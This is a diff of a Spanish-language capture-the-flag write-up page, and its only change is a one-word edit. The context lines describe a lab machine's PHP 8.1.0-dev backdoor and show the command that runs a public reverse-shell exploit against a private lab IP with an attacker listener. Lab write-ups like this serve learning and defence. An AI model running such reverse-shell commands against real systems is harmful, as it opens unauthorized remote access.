@@ -200,7 +200,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><p>En el puerto <strong>80</strong> hay un servidor <code>Apache/2.4.56</code> que pone lo siguiente:</p>
 <p><img src="/../machines/nyx/zero/http.webp" alt="http"></p>
-<p>En el puerto <strong>8080</strong> hay un servidor <code>PHP/8.1.0-dev</code> con el mismo mensaje.</p>
+<p>En el puerto <strong>8080</strong> hay un servidor <code>PHP/8.1.0-dev</code> con el mismo texto.</p>
 <p><img src="/../machines/nyx/zero/httpphp.webp" alt="httpphp"></p>
 <p>Buscando en internet con la palabra clave <code>PHP 8.1.0-dev</code> he encontrado este <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce">exploit</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ python3 revshell_php_8.1.0-dev.py http://192.168.1.56:8080 192.168.1.18 1234
